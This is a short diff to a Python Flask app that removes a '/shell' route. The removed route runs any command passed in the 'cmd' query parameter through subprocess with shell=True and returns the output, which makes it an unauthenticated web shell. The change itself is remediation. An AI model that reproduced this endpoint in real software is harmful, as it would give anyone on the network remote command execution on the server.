@@ -95,18 +95,6 @@ def upload():
     """
     return render_template_string(html)
 
-@app.route("/shell")
-def shell():
-    cmd = request.args.get("cmd")
-    if not cmd:
-        return "Komut girilmedi."
-    try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, timeout=5)
-    except subprocess.CalledProcessError as e:
-        output = e.output
-    except Exception as e:
-        output = str(e)
-    return f"<pre>{output}</pre>"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
